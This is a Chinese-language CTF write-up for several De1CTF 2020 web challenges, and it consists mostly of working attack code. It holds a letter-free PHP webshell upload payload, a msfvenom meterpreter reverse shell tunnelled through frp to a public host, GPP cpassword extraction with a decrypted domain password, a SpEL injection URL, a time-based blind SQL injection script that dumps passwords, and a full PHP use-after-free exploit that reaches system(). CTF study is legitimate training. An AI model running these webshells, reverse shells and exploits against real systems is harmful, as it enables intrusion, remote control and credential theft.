<h2><span id="hard_pentest_1">Hard_Pentest_1</span></h2><p>无字母webshell</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//Clear the uploads directory every hour</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$sandbox = <span class="string">"uploads/"</span>. md5(<span class="string">"De1CTF2020"</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">"submit"</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span> (($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">2048</span>) &amp;&amp; Check())&#123;</span><br><span class="line">        <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $filename=md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]).<span class="string">"_"</span>.$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $filename);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"save in:"</span> . $sandbox.<span class="string">"/"</span> . $filename;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Not Allow!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $BlackExts = <span class="keyword">array</span>(<span class="string">"php"</span>);</span><br><span class="line">    $ext = explode(<span class="string">"."</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">    $exts = trim(end($ext));</span><br><span class="line">    $file_content = file_get_contents($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">'/[a-z0-9;~^`&amp;|]/is'</span>,$file_content)  &amp;&amp; </span><br><span class="line">        !in_array($exts, $BlackExts) &amp;&amp; </span><br><span class="line">        !preg_match(<span class="string">'/\.\./'</span>,$_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>])) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;title&gt;upload&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action=<span class="string">"index.php"</span> method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">"file"</span> name=<span class="string">"file"</span> id=<span class="string">"file"</span>&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type=<span class="string">"submit"</span> name=<span class="string">"submit"</span> value=<span class="string">"submit"</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>上传exp：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?=$_=[]?&gt;&lt;?=$_=@&quot;$_&quot;?&gt;&lt;?=$_=$_[&apos;!&apos;==&apos;@&apos;]?&gt;&lt;?=$___=$_?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?= $___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$____=&apos;_&apos;?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$_=$$____?&gt;&lt;?=$_[__]($_[_])?&gt;</span><br></pre></td></tr></table></figure>

<p>POST:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">__=system&amp;_=<span class="keyword">echo</span> ^<span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_REQUEST[a]); &gt; a.php</span><br></pre></td></tr></table></figure>

<p>蚁剑拿到webshell，msf生成木马反弹shell</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">windows</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=公网ip lport=5820 -f exe -o test.exe</span><br></pre></td></tr></table></figure>

<p>frpc配置</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = 公网ip</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[msf]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">5820</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">5820</span></span><br></pre></td></tr></table></figure>

<p>把生成的.exe文件放到<code>47.113.219.76</code>上，运行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 127.0.0.1</span><br><span class="line">set lport 5820</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/nzjdsds/article/details/94361554" target="_blank" rel="noopener">GPP漏洞读取域用户</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">dir /s /a \\192.168.0.12\SYSVOL\*.xml</span><br><span class="line">type \\192.168.0.12\SYSVOL\De1CTF2020.lab\Policies\&#123;B1248E1E-B97D-4C41-8EA4-1F2600F9264B&#125;\Machine\Preferences\Groups\Groups.xml</span><br></pre></td></tr></table></figure>

<p>拿到cpassword，gpp-decrypt解密</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08</span><br><span class="line"></span><br><span class="line">dkk@kali:~$ gpp-decrypt uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08</span><br><span class="line">/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated</span><br><span class="line">zL1PpP@sSwO3d</span><br></pre></td></tr></table></figure>

<p>拿到flag和 下一题hint</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag1: De1CTF&#123;GpP_11Is_SoOOO_Ea3333y&#125;</span><br><span class="line"></span><br><span class="line">Get flag2 Hint:</span><br><span class="line">hint1: You need De1ta user to get flag2</span><br><span class="line">hint2: De1ta user&apos;s password length is 1-8, and the password is composed of [0-9a-f].</span><br><span class="line">hint3: Pay attention to the extended rights of De1ta user on the domain.</span><br><span class="line">hint4: flag2 in Domain Controller (C:\Users\Administrator\Desktop\flag.txt)</span><br><span class="line"></span><br><span class="line">PS: Please do not damage the environment after getting permission, thanks QAQ.</span><br></pre></td></tr></table></figure>

<h2><span id="calc">calc</span></h2><p>java的题…..不太会<br>题目不难，但是java自己没有认真学<br>payload:<br><code>http://106.52.164.141/spel/calc?calc=nEW java.io.BufferedReader(nEW java.io.FileReader(&quot;/flag&quot;)).readLine()</code><br>大小写绕过过滤</p>
<h2><span id="mixture">mixture</span></h2><p>测试发现除了<code>admin</code>账号，其他账号都可以任意密码登陆进去<br>在<code>/member.php</code>页面发现注释<code>&lt;!--orderby--&gt;</code><br>尝试提交参数<code>member.php?orderby=sleep</code>发现有过滤回显，CTF嘛哪里有过滤哪里就有洞</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">i=<span class="number">1</span></span><br><span class="line">n=<span class="number">2</span></span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line">header=&#123;<span class="string">"Cookie"</span>:<span class="string">"PHPSESSID=8985l543q88ke4ltd1trnum9e0"</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str_to_hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join([hex(ord(c)).replace(<span class="string">'0x'</span>, <span class="string">''</span>) <span class="keyword">for</span> c <span class="keyword">in</span> s])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(i)</span><br><span class="line">    m=<span class="number">128</span>/<span class="number">2</span></span><br><span class="line">    j=<span class="number">128</span>/<span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> q <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> q!=<span class="number">1</span>:</span><br><span class="line">            j=j/<span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line">                m=m+j</span><br><span class="line">            <span class="keyword">elif</span> n==<span class="number">0</span>:</span><br><span class="line">                m=m-j</span><br><span class="line">        m=int(m)</span><br><span class="line">        <span class="comment">#exp = "and(case when ascii(mid((select user())from(&#123;&#125;)for(1)))&gt;&#123;&#125; then benchmark(160000,sha(1)) else 'b' end)".format (i,m)</span></span><br><span class="line">        <span class="comment">#exp = "and(case when ascii(mid((select database())from(&#123;&#125;)for(1)))&gt;&#123;&#125; then benchmark(160000,sha(1)) else 'b' end)".format (i,m)</span></span><br><span class="line">        <span class="comment">#exp="and(case when ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database())from(&#123;&#125;)for(1)))&gt;&#123;&#125; then benchmark(160000,sha(1)) else 'b' end)".format (i,m)</span></span><br><span class="line">        <span class="comment">#exp = "and(case when ascii(mid((select group_concat(column_name) from information_schema.columns where table_name='member')from(&#123;&#125;)for(1)))&gt;&#123;&#125; then benchmark(160000,sha(1)) else 'b' end)".format (i,m)</span></span><br><span class="line">        exp = <span class="string">"and(case when ascii(mid((select group_concat(password) from member)from(&#123;&#125;)for(1)))&gt;&#123;&#125; then benchmark(160000,sha(1)) else 'b' end)"</span>.format (i,m)</span><br><span class="line">        url = <span class="string">'http://134.175.185.244/member.php?orderby=&#123;&#125;'</span>.format(exp)</span><br><span class="line">        print(m)</span><br><span class="line">        startTime=time.time()</span><br><span class="line">        p=requests.get(url,timeout=<span class="number">100</span>,headers=header)</span><br><span class="line">        <span class="keyword">if</span> time.time()-startTime&gt;<span class="number">4</span>:</span><br><span class="line">            n=<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            n=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> q==<span class="number">7</span>:</span><br><span class="line">            <span class="keyword">if</span> time.time()-startTime&gt;<span class="number">4</span>:</span><br><span class="line">                flag=flag+chr(m+<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flag=flag+chr(m)</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure>

<p>webpwn题，后面不太会了</p>
<h2><span id="easy-php-uaf">Easy PHP UAF</span></h2><p>exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//<span class="meta">&lt;?php</span></span></span><br><span class="line"></span><br><span class="line">pwn(<span class="string">"ls"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span><span class="params">($val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">"0x"</span>.dechex($val).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $abc, $helper, $backtrace, $backtrace2;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $a;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">			<span class="keyword">global</span> $backtrace;</span><br><span class="line">			<span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">			$backtrace = (<span class="keyword">new</span> <span class="keyword">Exception</span>)-&gt;getTrace(); <span class="comment"># ;)</span></span><br><span class="line">			<span class="keyword">if</span>(!<span class="keyword">isset</span>($backtrace[<span class="number">1</span>][<span class="string">'args'</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">				$backtrace = debug_backtrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">allocate</span><span class="params">(&amp;$a, $depth)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> ($depth === <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">		$a[] = str_shuffle(str_repeat(<span class="string">'A'</span>, <span class="number">0x180</span><span class="number">-0x18</span><span class="number">-1</span>));</span><br><span class="line">		$a[] = str_shuffle(str_repeat(<span class="string">'A'</span>, <span class="number">0x180</span><span class="number">-0x18</span><span class="number">-1</span>));</span><br><span class="line">		$a[] = str_shuffle(str_repeat(<span class="string">'A'</span>, <span class="number">0x180</span><span class="number">-0x18</span><span class="number">-1</span>));</span><br><span class="line">		$a[] = str_shuffle(str_repeat(<span class="string">'A'</span>, <span class="number">0x180</span><span class="number">-0x18</span><span class="number">-1</span>));</span><br><span class="line">		$a[] = str_shuffle(str_repeat(<span class="string">'A'</span>, <span class="number">0x180</span><span class="number">-0x18</span><span class="number">-1</span>));</span><br><span class="line">		$a[] = str_shuffle(str_repeat(<span class="string">'A'</span>, <span class="number">0x180</span><span class="number">-0x18</span><span class="number">-1</span>));</span><br><span class="line">		$a[] = str_shuffle(str_repeat(<span class="string">'A'</span>, <span class="number">0x180</span><span class="number">-0x18</span><span class="number">-1</span>));</span><br><span class="line">		$a[] = str_shuffle(str_repeat(<span class="string">'A'</span>, <span class="number">0x180</span><span class="number">-0x18</span><span class="number">-1</span>));</span><br><span class="line">		$a[] = str_shuffle(str_repeat(<span class="string">'A'</span>, <span class="number">0x180</span><span class="number">-0x18</span><span class="number">-1</span>));</span><br><span class="line">		$a[] = str_shuffle(str_repeat(<span class="string">'A'</span>, <span class="number">0x180</span><span class="number">-0x18</span><span class="number">-1</span>));</span><br><span class="line">		allocate($a, $depth - <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span><span class="params">(&amp;$str, $p = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">		$address = <span class="number">0</span>;</span><br><span class="line">		$address |= ord($str[$p+<span class="number">7</span>]);</span><br><span class="line">		$address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">		$address |= ord($str[$p+<span class="number">6</span>]);</span><br><span class="line">		$address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">		$address |= ord($str[$p+<span class="number">5</span>]);</span><br><span class="line">		$address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">		$address |= ord($str[$p+<span class="number">4</span>]);</span><br><span class="line">		$address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">		$address |= ord($str[$p+<span class="number">3</span>]);</span><br><span class="line">		$address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">		$address |= ord($str[$p+<span class="number">2</span>]);</span><br><span class="line">		$address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">		$address |= ord($str[$p+<span class="number">1</span>]);</span><br><span class="line">		$address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">		$address |= ord($str[$p+<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span> $address;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(&amp;$str, $p, $v)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		$str[$p+<span class="number">0</span>] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">		$v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">		$str[$p+<span class="number">1</span>] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">		$v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">		$str[$p+<span class="number">2</span>] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">		$v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">		$str[$p+<span class="number">3</span>] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">		$v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">		$str[$p+<span class="number">4</span>] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">		$v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">		$str[$p+<span class="number">5</span>] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">		$v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">		$str[$p+<span class="number">6</span>] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">		$v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">		$str[$p+<span class="number">7</span>] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">memRead</span><span class="params">($addr)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $abc, $helper;</span><br><span class="line">		write($abc, <span class="number">0xa8</span>, $addr - <span class="number">0x10</span>);</span><br><span class="line">		<span class="keyword">return</span> strlen($helper-&gt;a);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span><span class="params">($arg)</span> </span>&#123;</span><br><span class="line">		<span class="comment"># str_shuffle prevents opcache string interning</span></span><br><span class="line">		$arg = str_shuffle(str_repeat(<span class="string">'A'</span>, <span class="number">79</span>));</span><br><span class="line">		$vuln = <span class="keyword">new</span> Vuln();</span><br><span class="line">		$vuln-&gt;a = $arg;</span><br><span class="line">	&#125;</span><br><span class="line">	$contiguous = [];</span><br><span class="line">	allocate($contiguous, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	trigger_uaf(<span class="string">'x'</span>);</span><br><span class="line">	$abc = $backtrace[<span class="number">1</span>][<span class="string">'args'</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">	$helper = <span class="keyword">new</span> Helper;</span><br><span class="line">	$helper-&gt;a = $helper;</span><br><span class="line">	$helper-&gt;b = <span class="function"><span class="keyword">function</span><span class="params">($x)</span> </span>&#123;&#125;;</span><br><span class="line">	$helper-&gt;c = <span class="number">0x1337</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (strlen($abc) == <span class="number">79</span> <span class="comment">/*|| strlen($abc) == 0*/</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"UAF failed"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment"># leaks</span></span><br><span class="line">	$closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">	$php_heap = str2ptr($abc, <span class="number">0x10</span>);</span><br><span class="line">	$helper-&gt;a = <span class="string">"helper"</span>; <span class="comment">// otherwise a strage crash</span></span><br><span class="line">	$abc_addr = $php_heap + <span class="number">0x18</span>;</span><br><span class="line">	$libphp_addr = str2ptr($abc, <span class="number">0</span>) - <span class="number">0xd73ec0</span>;</span><br><span class="line">	$zif_system = $libphp_addr + <span class="number">0x355a86</span>;</span><br><span class="line">	$helper-&gt;b = <span class="function"><span class="keyword">function</span><span class="params">($x)</span></span>&#123;&#125;;</span><br><span class="line">	$closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line">	<span class="keyword">echo</span> (<span class="string">"abc_addr = "</span>.hex($abc_addr));</span><br><span class="line">	<span class="keyword">echo</span> (<span class="string">"libphp_addr = "</span>.hex($libphp_addr));</span><br><span class="line">	<span class="keyword">echo</span> (<span class="string">"zif_system = "</span>.hex($zif_system));</span><br><span class="line">	<span class="keyword">echo</span> (<span class="string">"closure_obj = "</span>.hex($closure_obj));</span><br><span class="line">	<span class="keyword">echo</span> (<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// fake value</span></span><br><span class="line">	write($abc, <span class="number">0x10</span>, $closure_obj);</span><br><span class="line">	write($abc, <span class="number">0x18</span>, <span class="number">0x6</span>);</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">copyFunc</span><span class="params">($off)</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> $helper;</span><br><span class="line">		<span class="keyword">global</span> $abc;</span><br><span class="line">		<span class="keyword">if</span> ($off &gt; <span class="number">0x110</span>) <span class="keyword">return</span>;</span><br><span class="line">		write($abc, <span class="number">0xd0</span> + <span class="number">0x18</span> + $off, str2ptr($helper-&gt;a, $off));</span><br><span class="line">		write($abc, <span class="number">0xd0</span> + <span class="number">0x20</span> + $off, str2ptr($helper-&gt;a, $off+<span class="number">8</span>));</span><br><span class="line">		write($abc, <span class="number">0xd0</span> + <span class="number">0x28</span> + $off, str2ptr($helper-&gt;a, $off+<span class="number">0x10</span>));</span><br><span class="line">		write($abc, <span class="number">0xd0</span> + <span class="number">0x30</span> + $off, str2ptr($helper-&gt;a, $off+<span class="number">0x18</span>));</span><br><span class="line">		write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span> + $off, str2ptr($helper-&gt;a, $off+<span class="number">0x20</span>));</span><br><span class="line">		write($abc, <span class="number">0xd0</span> + <span class="number">0x40</span> + $off, str2ptr($helper-&gt;a, $off+<span class="number">0x28</span>));</span><br><span class="line">		write($abc, <span class="number">0xd0</span> + <span class="number">0x48</span> + $off, str2ptr($helper-&gt;a, $off+<span class="number">0x30</span>));</span><br><span class="line">		write($abc, <span class="number">0xd0</span> + <span class="number">0x50</span> + $off, str2ptr($helper-&gt;a, $off+<span class="number">0x38</span>));</span><br><span class="line">		write($abc, <span class="number">0xd0</span> + <span class="number">0x58</span> + $off, str2ptr($helper-&gt;a, $off+<span class="number">0x40</span>));</span><br><span class="line">		write($abc, <span class="number">0xd0</span> + <span class="number">0x60</span> + $off, str2ptr($helper-&gt;a, $off+<span class="number">0x48</span>));</span><br><span class="line">		write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span> + $off, str2ptr($helper-&gt;a, $off+<span class="number">0x50</span>));</span><br><span class="line">		write($abc, <span class="number">0xd0</span> + <span class="number">0x70</span> + $off, str2ptr($helper-&gt;a, $off+<span class="number">0x58</span>));</span><br><span class="line">		write($abc, <span class="number">0xd0</span> + <span class="number">0x78</span> + $off, str2ptr($helper-&gt;a, $off+<span class="number">0x60</span>));</span><br><span class="line">		write($abc, <span class="number">0xd0</span> + <span class="number">0x80</span> + $off, str2ptr($helper-&gt;a, $off+<span class="number">0x68</span>));</span><br><span class="line">		write($abc, <span class="number">0xd0</span> + <span class="number">0x88</span> + $off, str2ptr($helper-&gt;a, $off+<span class="number">0x70</span>));</span><br><span class="line">		write($abc, <span class="number">0xd0</span> + <span class="number">0x90</span> + $off, str2ptr($helper-&gt;a, $off+<span class="number">0x78</span>));</span><br><span class="line">		write($abc, <span class="number">0xd0</span> + <span class="number">0x98</span> + $off, str2ptr($helper-&gt;a, $off+<span class="number">0x80</span>));</span><br><span class="line">		write($abc, <span class="number">0xd0</span> + <span class="number">0xa0</span> + $off, str2ptr($helper-&gt;a, $off+<span class="number">0x88</span>));</span><br><span class="line">		copyFunc($off + <span class="number">0x90</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	write($abc, <span class="number">0xd0</span>, <span class="number">0x0000031800000002</span>);</span><br><span class="line">	write($abc, <span class="number">0xd0</span> + <span class="number">8</span>, <span class="number">0x0000000000000003</span>);</span><br><span class="line">	copyFunc(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">0x0210000000000001</span>);</span><br><span class="line">	write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system);</span><br><span class="line">	write($abc, <span class="number">0x20</span>, $abc_addr + <span class="number">0xd0</span>);</span><br><span class="line"></span><br><span class="line">	($helper-&gt;b)($cmd);</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">"end"</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
